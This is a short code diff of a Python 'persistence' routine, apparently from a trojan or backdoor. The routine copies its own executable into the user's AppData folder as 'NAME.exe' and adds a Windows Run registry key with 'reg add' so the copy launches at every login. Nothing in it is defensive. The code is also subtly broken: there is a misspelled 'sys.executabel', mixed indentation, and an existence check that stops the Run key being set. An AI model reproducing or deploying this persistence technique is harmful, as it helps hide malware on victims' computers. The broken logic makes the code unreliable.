@@ -3,10 +3,11 @@ import shutil
 def persistence(self):
 	secret_loc = os.environ["appdata"]+ "\\NAME.exe"
 	try:
-    shutil.copyfile(__file__, secret_loc)
-  except:
-    shutil.copyfile(sys.executabel, secret_loc)
-	subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v name /t REG_SZ /d "' + secret_loc + '"', shell=True)
+    		shutil.copyfile(__file__, secret_loc)
+  	except:
+   		 shutil.copyfile(sys.executabel, secret_loc)
+	if not os.path.exists(secret_loc):
+		subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v name /t REG_SZ /d "' + secret_loc + '"', shell=True)
   
   
   
